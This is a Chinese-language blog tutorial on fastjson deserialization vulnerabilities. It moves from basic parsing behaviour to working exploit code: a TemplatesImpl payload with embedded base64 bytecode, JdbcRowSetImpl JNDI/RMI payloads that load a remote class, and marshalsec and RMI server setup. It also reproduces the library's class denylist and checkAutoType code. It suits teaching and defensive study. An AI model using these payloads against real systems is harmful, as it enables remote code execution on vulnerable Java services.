@@ -1,0 +1,1188 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>从零开始学习fastjson反序列化 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="从零开始学习fastjson反序列化 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="一、什么是fastjson?
+fastjson是一个Java语言编写的高性能功能完善的JSON库。它采用一种&quot;假定有序快速匹配&quot;的算法，把JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库。Fas..." />
+    <meta name="keywords" content="Java,反序列化,fastjson" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              从零开始学习fastjson反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-07
+              </span>
+              <span>
+                29 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://le1a.github.io/tag/GFgYd4cfBjN/" class="post-tag">
+                  # fastjson
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="一-什么是fastjson">一、什么是fastjson?</h2>
+<p><code>fastjson</code>是一个Java语言编写的高性能功能完善的<code>JSON</code>库。它采用一种&quot;假定有序快速匹配&quot;的算法，把JSON Parse的性能提升到极致，是目前Java语言中最快的JSON库。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。</p>
+<h2 id="二-fastjson使用简介">二、fastjson使用简介</h2>
+<p>用来实现Java对象与JSON字符串的相互转换，比如:</p>
+<pre><code class="language-java">User user = new User();
+user.setUserName(&quot;Le1a&quot;);
+user.setAge(20);
+user.setSex(&quot;男&quot;);
+String userJson = JSON.toJSONString(user);
+</code></pre>
+<p>输出结果：</p>
+<pre><code class="language-json">{&quot;age&quot;:20,&quot;sex&quot;:&quot;男&quot;,&quot;userName&quot;:&quot;Le1a&quot;}
+</code></pre>
+<p>以上将对象转换为JSON字符串的操作成为序列化，将JSON字符串实例化为Java对象的操作成为反序列化。</p>
+<h2 id="三-fastjson反序列化机制">三、fastjson反序列化机制</h2>
+<h3 id="case1">Case1:</h3>
+<p>User类</p>
+<pre><code class="language-java">public class User{
+    private int  age;
+    private String userName;
+    private String sex;
+    public User() {
+        System.out.println(&quot;User construct&quot;);
+    }
+
+    public String getUserName() {
+        System.out.println(&quot;getUserName&quot;);
+        return userName;
+    }
+    public int getAge() {
+        System.out.println(&quot;getAge&quot;);
+        return age;
+    }
+    public String getSex() {
+        System.out.println(&quot;getSex&quot;);
+        return sex;
+    }
+
+    public void setUserName(String userName) {
+        System.out.println(&quot;setUserName:&quot; + userName);
+        this.userName = userName;
+    }
+
+    public void setAge(int age) {
+        System.out.println(&quot;setAge:&quot; + age);
+        this.age = age;
+    }
+
+    public void setSex(String sex) {
+        System.out.println(&quot;setSex:&quot; + sex);
+        this.sex = sex;
+    }
+}
+</code></pre>
+<p>执行反序列化:</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+import java.io.*;
+
+public class Ser1 {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+        String jsonstr = &quot;{\&quot;age\&quot;:20,\&quot;sex\&quot;:\&quot;男\&quot;,\&quot;userName\&quot;:\&quot;Le1a\&quot;}&quot;;
+    }
+}
+</code></pre>
+<p>执行结果:</p>
+<pre><code>User construct
+setAge:20
+setSex:男
+setUserName:Le1a
+</code></pre>
+<p>这个执行结果说明了: fastjson在反序列化的时候会调用这个类的setter方法。那如果没有setter方法，还能正确赋值吗？</p>
+<p>所以接下来看第二种机制。</p>
+<h3 id="case2">Case2:</h3>
+<p>User类</p>
+<pre><code class="language-java">public class User{
+    public int  age;
+    public String userName;
+    public String sex;
+    public User() {
+        System.out.println(&quot;User construct&quot;);
+   
+    }
+
+    public String getUserName() {
+        System.out.println(&quot;getUserName&quot;);
+        return userName;
+    }
+    public int getAge() {
+        System.out.println(&quot;getAge&quot;);
+        return age;
+    }
+    public String getSex() {
+        System.out.println(&quot;getSex&quot;);
+        return sex;
+    }
+}
+</code></pre>
+<p>执行反序列化:</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+import java.io.*;
+
+public class Ser1 {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+        String jsonstr = &quot;{\&quot;age\&quot;:20,\&quot;sex\&quot;:\&quot;男\&quot;,\&quot;userName\&quot;:\&quot;Le1a\&quot;}&quot;;
+        User user = JSON.parseObject(jsonstr, User.class);
+        System.out.println(&quot;age:&quot; + user.age);
+        System.out.println(&quot;setSex:&quot; + user.sex);
+        System.out.println(&quot;userName:&quot; + user.userName);
+    }
+}
+</code></pre>
+<p>执行结果:</p>
+<pre><code class="language-java">User construct
+age:20
+setSex:男
+userName:Le1a
+</code></pre>
+<p>发现没有setter方法的时候，fastjson也会对Field正确赋值，但是前提条件是Field必须为public属性。如果不是public属性也没有setter方法呢？接着来看另一种方法！</p>
+<h3 id="case3">Case3:</h3>
+<p>将Field 属性改为私有，不提供setter</p>
+<p>User类</p>
+<pre><code class="language-java">
+public class User{
+    private int  age;
+    private String userName;
+    private String sex;
+    public User() {
+        System.out.println(&quot;User construct&quot;);
+    }
+
+    public String getUserName() {
+        return userName;
+    }
+    public int getAge() {
+        return age;
+    }
+    public String getSex() {
+        return sex;
+    }
+}
+</code></pre>
+<p>执行反序列化:</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+import java.io.*;
+
+public class Ser1 {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+        String jsonstr = &quot;{\&quot;age\&quot;:20,\&quot;sex\&quot;:\&quot;男\&quot;,\&quot;userName\&quot;:\&quot;Le1a\&quot;}&quot;;
+        User user = JSON.parseObject(jsonstr, User.class);
+        System.out.println(&quot;age:&quot; + user.getAge());
+        System.out.println(&quot;setSex:&quot; + user.getSex());
+        System.out.println(&quot;userName:&quot; + user.getUserName());
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220407164429700.png" alt="image-20220407164429700" loading="lazy"></figure>
+<p>输出结果为:</p>
+<pre><code>User construct
+age:0
+setSex:null
+userName:null
+</code></pre>
+<p>发现并没有对Field进行赋值，打印出来的都是Field的默认初始值。以上说明对于不可见Field且未提供setter方法，fastjson默认不会赋值。</p>
+<p>将反序列化代码修改为如下：</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+import java.io.*;
+
+public class Ser1 {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+        String jsonstr = &quot;{\&quot;age\&quot;:20,\&quot;sex\&quot;:\&quot;男\&quot;,\&quot;userName\&quot;:\&quot;Le1a\&quot;}&quot;;
+        User user = JSON.parseObject(jsonstr, User.class,Feature.SupportNonPublicField);
+        System.out.println(&quot;age:&quot; + user.getAge());
+        System.out.println(&quot;setSex:&quot; + user.getSex());
+        System.out.println(&quot;userName:&quot; + user.getUserName());
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220407165105570.png" alt="image-20220407165105570" loading="lazy"></figure>
+<p>输出结果为:</p>
+<pre><code>User construct
+age:20
+setSex:男
+userName:Le1a
+</code></pre>
+<p>可见: 对于未提供setter的私有Field，fastjson在反序列化时需要显式提供参数<code>Feature.SupportNonPublicField</code>才会正确赋值。</p>
+<h2 id="四-漏洞原理">四、漏洞原理</h2>
+<p>fastjson支持使用<code>@type</code>来指定反序列化的目标类，如下演示：</p>
+<p>User类</p>
+<pre><code class="language-java">public class User{
+    private int  age;
+    private String userName;
+    private String sex;
+    public User() {
+        System.out.println(&quot;User construct&quot;);
+    }
+
+    public String getUserName() {
+        System.out.println(&quot;getUserName&quot;);
+        return userName;
+    }
+    public int getAge() {
+        System.out.println(&quot;getAge&quot;);
+        return age;
+    }
+    public String getSex() {
+        System.out.println(&quot;getSex&quot;);
+        return sex;
+    }
+
+    public void setUserName(String userName) {
+        System.out.println(&quot;setUserName:&quot; + userName);
+        this.userName = userName;
+    }
+
+    public void setAge(int age) {
+        System.out.println(&quot;setAge:&quot; + age);
+        this.age = age;
+    }
+
+    public void setSex(String sex) {
+        System.out.println(&quot;setSex:&quot; + sex);
+        this.sex = sex;
+    }
+}
+</code></pre>
+<p>执行反序列化</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson.parser.Feature;
+
+import java.io.IOException;
+
+public class Ser2 {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+        String jsonstr = &quot;{\&quot;@type\&quot;:\&quot;Evil\&quot;,\&quot;age\&quot;:20,\&quot;sex\&quot;:\&quot;男\&quot;,\&quot;userName\&quot;:\&quot;Le1a\&quot;}&quot;;
+        Object user = JSON.parseObject(jsonstr);
+    }
+}
+</code></pre>
+<p>执行结果为:</p>
+<pre><code>User construct
+setAge:20
+setSex:男
+setUserName:Le1a
+getAge
+getSex
+getUserName
+</code></pre>
+<p>JSON字符串<code>@type</code>的值为User，也就指定了要将此JSON字符串实例化为User对象，在此过程中fastjson不仅调用了setter也调用了getter。</p>
+<p>假设这个<code>@type</code>指向一个恶意类，那是不是就能触发恶意代码呢？</p>
+<p>我们来写一个<code>Evil</code>类</p>
+<pre><code class="language-java">public class Evil {
+    static {
+        System.err.println(&quot;Hacker！！！&quot;);
+        try {
+            java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch ( Exception e ) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220407170934182.png" alt="image-20220407170934182" loading="lazy"></figure>
+<p>成功执行了恶意命令，实际应用中肯定很难找到像Evil这种代码，攻击者要想办法通过现有的让JVM加载构造的恶意类，就得来构造Gadget。</p>
+<h2 id="五-漏洞利用">五、漏洞利用</h2>
+<h3 id="1templatesimpl">1.TemplatesImpl</h3>
+<p>利用fastjson反序列化后会调用属性的getter，可以使用之前学习的TemplatesImpl。</p>
+<p>恶意类:</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import sun.plugin.com.JavaClass;
+
+import java.lang.reflect.Method;
+
+public class Shell extends AbstractTranslet {
+    public Shell() throws Exception{
+        Class runtime = Class.forName(&quot;java.lang.Runtime&quot;);
+        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);
+        Method getruntime = runtime.getMethod(&quot;getRuntime&quot;);
+        Object r = getruntime.invoke(runtime);
+        exec.invoke(r,&quot;calc&quot;);
+        System.out.println(&quot;Hacker！！！&quot;);
+    }
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<h4 id="exp">EXP</h4>
+<pre><code class="language-java">import com.alibaba.fastjson.parser.ParserConfig;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.InputStream;
+import java.util.Base64;
+
+public class TemplatesImpl {
+    public static void main(String[] args) throws Exception {
+        ParserConfig config = new ParserConfig();
+        String base64Evil =  fileToBase64(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\Fastjson\\target\\classes\\Shell.class&quot;);
+        //System.out.println(base64Evil);
+        String payload = &quot;{\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAUAoAEAAvCAAwCgAFADEIABoHADIHADMKAAUANAgANQcANgoANwA4CAA5CQA6ADsIADwKAD0APgcAPwcAQAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTFNoZWxsOwEAB3J1bnRpbWUBABFMamF2YS9sYW5nL0NsYXNzOwEABGV4ZWMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEACmdldHJ1bnRpbWUBAAFyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAKRXhjZXB0aW9ucwcAQQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAEIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAApTaGVsbC5qYXZhDAARABIBABFqYXZhLmxhbmcuUnVudGltZQwAQwBEAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwwARQBGAQAKZ2V0UnVudGltZQEAEGphdmEvbGFuZy9PYmplY3QHAEcMAEgASQEABGNhbGMHAEoMAEsATAEAD0hhY2tlcu+8ge+8ge+8gQcATQwATgBPAQAFU2hlbGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAA8AEAAAAAAAAwABABEAEgACABMAAAC3AAYABQAAAEkqtwABEgK4AANMKxIEBL0ABVkDEgZTtgAHTSsSCAO9AAW2AAdOLSsDvQAJtgAKOgQsGQQEvQAJWQMSC1O2AApXsgAMEg22AA6xAAAAAgAUAAAAIgAIAAAACwAEAAwACgANABoADgAlAA8AMAAQAEAAEQBIABIAFQAAADQABQAAAEkAFgAXAAAACgA/ABgAGQABABoALwAaABsAAgAlACQAHAAbAAMAMAAZAB0AHgAEAB8AAAAEAAEAIAABACEAIgACABMAAAA/AAAAAwAAAAGxAAAAAgAUAAAABgABAAAAFgAVAAAAIAADAAAAAQAWABcAAAAAAAEAIwAkAAEAAAABACUAJgACAB8AAAAEAAEAJwABACEAKAACABMAAABJAAAABAAAAAGxAAAAAgAUAAAABgABAAAAGwAVAAAAKgAEAAAAAQAWABcAAAAAAAEAIwAkAAEAAAABACkAKgACAAAAAQArACwAAwAfAAAABAABACcAAQAtAAAAAgAu\&quot;],\&quot;_name\&quot; : \&quot;a\&quot;,\&quot;_tfactory\&quot; : {},\&quot;outputProperties\&quot; : {}}&quot;;
+        System.out.println(payload);
+
+    }
+
+    public static String fileToBase64(String path) throws Exception{
+        String base64Result=null;
+        InputStream inputStream = null;
+
+        File file = new File(path);
+        inputStream = new FileInputStream(file);
+        byte[] bytes = new byte[inputStream.available()];
+        inputStream.read(bytes,0,inputStream.available());
+        base64Result = new String(Base64.getEncoder().encode(bytes));
+        return base64Result;
+    }
+
+}
+
+</code></pre>
+<p>成功执行命令。<code>_bytecodes</code>是私有属性，<code>_name</code>也是私有域，所以在<code>parseObject</code>的时候需要设置<code>Feature.SupportNonPublicField</code>，这样_bytecodes字段才会被反序列化。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220407203535843.png" alt="image-20220407203535843" loading="lazy"></figure>
+<h3 id="2jndi注入">2.JNDI注入</h3>
+<h4 id="21rmi">2.1RMI</h4>
+<p>反序列化Gadget主流都是使用JNDI，现阶段都是在利用根据JNDI特征自动化挖掘Gadget。</p>
+<p><code>com.sun.rowset.JdbcRowSetImpl</code>这个类有两个set方法，分别是<code>setDataSourceName()</code>与<code>setAutoCommit()</code>,我们看一下相关实现：</p>
+<p>setDatasourceName</p>
+<pre><code class="language-java">public void setDataSourceName(String name) throws SQLException {
+
+    if (name == null) {
+        dataSource = null;
+    } else if (name.equals(&quot;&quot;)) {
+       throw new SQLException(&quot;DataSource name cannot be empty string&quot;);
+    } else {
+       dataSource = name;
+    }
+
+    URL = null;
+}
+</code></pre>
+<p>setAutoCommit</p>
+<pre><code class="language-java">public void setAutoCommit(boolean var1) throws SQLException {
+    if (this.conn != null) {
+        this.conn.setAutoCommit(var1);
+    } else {
+        this.conn = this.connect();
+        this.conn.setAutoCommit(var1);
+    }
+
+}
+</code></pre>
+<p>这里的setDataSourceName就是设置了dataSourceName,然后在setAutoCommit中进行了connect操作，我们跟进看一下</p>
+<pre><code class="language-java">protected Connection connect() throws SQLException {
+    if (this.conn != null) {
+        return this.conn;
+    } else if (this.getDataSourceName() != null) {
+        try {
+            InitialContext var1 = new InitialContext();
+            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+            return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+        } catch (NamingException var3) {
+            throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+        }
+    } else {
+        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+    }
+}
+</code></pre>
+<p>可以看到这里connect方法中有典型的<code>jndi</code>的<code>lookup</code>方法调用，且参数就是我们在<code>setDataSourceName</code>中设置的<code>dataSourceName</code>，来构造一下payload，dataSourceName的值为我们恶意的rmi对象</p>
+<pre><code class="language-json">{&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Evil&quot;, &quot;autoCommit&quot;:true}}
+</code></pre>
+<h5 id="工具启动rmi服务">工具启动RMI服务</h5>
+<p>这里有一款工具： https://github.com/RandomRobbieBF/marshalsec-jar</p>
+<p>先将恶意Evil类部署到http服务上，可以直接使用<code>python -m http.server</code>。我这里就直接部署到公网上了，然后使用如下命令快速搭建一个rmi服务器，并把恶意的远程对象注册到上面</p>
+<pre><code class="language-java">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:端口/#Evil
+</code></pre>
+<p>这样rmi服务就快速搭起来了，运行一下，成功弹出计算器</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+import java.io.IOException;
+
+public class SerJndi {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+
+        String jsonstr = &quot;{\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://IP:1099/Evil\&quot;, \&quot;autoCommit\&quot;:true}}&quot;;
+        JSON.parseObject(jsonstr,Feature.SupportNonPublicField);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220408171459320.png" alt="image-20220408171459320" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220408171424438.png" alt="image-20220408171424438" loading="lazy"></figure>
+<h5 id="手动启动rmi服务">手动启动RMI服务</h5>
+<p>同样先将恶意Evil类部署到http服务上，直接使用<code>python -m http.server 8000</code>，然后创建<code>JNDIServer.java</code></p>
+<pre><code class="language-java">import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class JNDIServer {
+    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        Reference reference = new Reference(&quot;Exploit&quot;,&quot;Evil&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        //第一个参数是
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        registry.bind(&quot;Exploit&quot;,referenceWrapper);
+    }
+}
+</code></pre>
+<p>RMI服务端可以直接绑定远程调用的对象以外，还可通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用<code>Referenceable.getReference()</code>获取绑定对象的引用，并在目录中保存，当客户端使用<code>lookup</code>获取对应名字时，会返回<code>ReferenceWrapper</code>类的代理文件，然后会调用<code>getReference()</code>获取<code>Reference</code>类，最终通过<code>factory</code>类将<code>Reference</code>转换为具体的对象实例。</p>
+<p>这里为了防止本地触发恶意代码，就选择了通过<code>References</code>类绑定远程对象。第一个参数是开启rmi服务后的恶意类名，第二个参数是恶意类本体，第三个参数是远程对象的URL。</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/64af3ad1a31ff.webp" alt="image-20220517195233145" loading="lazy"></figure>
+<p>服务端JNDIClient</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSON;
+
+public class JNDIClient {
+    public static void main(String[] argv){
+        String payload = &quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true}&quot;;
+        JSON.parse(payload);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220517195726154.png" alt="image-20220517195726154" loading="lazy"></figure>
+<h4 id="22ladp">2.2LADP</h4>
+<h2 id="六-fastjson各版本绕过">六、Fastjson各版本绕过</h2>
+<h3 id="1224">1.2.24</h3>
+<p>Fastjson 1.2.25之前版本，只是通过黑名单限制哪些类不能通过<code>@type</code>指定。</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>和<code>com.sun.rowset.JdbcRowSetImpl</code>都不在黑名单中，可以直接完成攻击，代码参考上文。</p>
+<h3 id="1225">1.2.25</h3>
+<p>1.2.25版本修复了这个漏洞，添加了配置项<code>setAutoTypeSupport</code>，并且使用了<code>checkAutoType</code>函数定义黑白名单的方式来防御反序列化漏洞。</p>
+<p>当 autoTypeSupport 为 <code>False</code> 时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错。当 autoTypeSupport 为 True 时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤。</p>
+<p><code>com.alibaba.fastjson.parser.ParserConfig</code>类中有一个<code>String[]</code>类型的denyList数组，denyList中定义了反序列化的黑名单的类包名，1.2.25-1.2.41版本中会对以下包名进行过滤</p>
+<pre><code class="language-java">bsh
+com.mchange
+com.sun.
+java.lang.Thread
+java.net.Socket
+java.rmi
+javax.xml
+org.apache.bcel
+org.apache.commons.beanutils
+org.apache.commons.collections.Transformer
+org.apache.commons.collections.functors
+org.apache.commons.collections4.comparators
+org.apache.commons.fileupload
+org.apache.myfaces.context.servlet
+org.apache.tomcat
+org.apache.wicket.util
+org.apache.xalan
+org.codehaus.groovy.runtime
+org.hibernate
+org.jboss
+org.mozilla.javascript
+org.python.core
+org.springframework
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220517211033490.png" alt="image-20220517211033490" loading="lazy"></figure>
+<pre><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
+	//类名是否为空
+    if (typeName == null) {
+        return null;
+		//类全路径是否超过128字符
+    } else if (typeName.length() &gt;= 128) {
+        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+    } else {
+        String className = typeName.replace('$', '.');
+        Class&lt;?&gt; clazz = null;
+        int mask;
+        String accept;
+		//如果支持AutoType功能会进入这个if判断
+        if (this.autoTypeSupport || expectClass != null) {
+            for(mask = 0; mask &lt; this.acceptList.length; ++mask) {
+                accept = this.acceptList[mask];
+                if (className.startsWith(accept)) {
+                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
+                    if (clazz != null) {
+                        return clazz;
+                    }
+                }
+            }
+ 
+            for(mask = 0; mask &lt; this.denyList.length; ++mask) {
+                accept = this.denyList[mask];
+                if (className.startsWith(accept) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+            }
+        }
+		
+        if (clazz == null) {
+            clazz = TypeUtils.getClassFromMapping(typeName);
+        }
+ 
+        if (clazz == null) {
+            clazz = this.deserializers.findClass(typeName);
+        }
+ 
+        if (clazz != null) {
+            if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            } else {
+                return clazz;
+            }
+        } else {
+			//是否不支持AutoType功能
+            if (!this.autoTypeSupport) {
+				//先匹配黑名单
+                for(mask = 0; mask &lt; this.denyList.length; ++mask) {
+                    accept = this.denyList[mask];
+                    //进行黑名单过滤，抛出异常
+                    if (className.startsWith(accept)) {
+                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                    }
+                }
+ 
+				//再从白名单找
+                for(mask = 0; mask &lt; this.acceptList.length; ++mask) {
